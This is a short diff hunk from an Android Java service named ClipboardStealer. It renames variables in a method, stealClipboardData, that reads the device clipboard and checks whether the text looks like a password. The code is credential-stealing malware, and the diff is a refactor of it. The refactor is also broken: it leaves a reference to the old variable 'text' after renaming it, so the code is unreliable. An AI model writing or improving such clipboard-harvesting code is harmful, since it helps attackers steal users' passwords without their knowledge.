@@ -50,13 +50,13 @@ public class ClipboardStealer extends Service {
     
     private void stealClipboardData() {
         if (clipboardManager.hasPrimaryClip()) {
-            ClipData clip = clipboardManager.getPrimaryClip();
+            ClipData clipboardData = clipboardManager.getPrimaryClip();
             
-            if (clip != null && clip.getItemCount() > 0) {
-                CharSequence text = clip.getItemAt(0).getText();
+            if (clipboardData != null && clipboardData.getItemCount() > 0) {
+                CharSequence clipboardText = clipboardData.getItemAt(0).getText();
                 
                 if (text != null) {
-                    String clipboardContent = text.toString();
+                    String clipboardContent = clipboardText.toString();
                     
                     // Check if it looks like a password
                     if (looksLikePassword(clipboardContent)) {
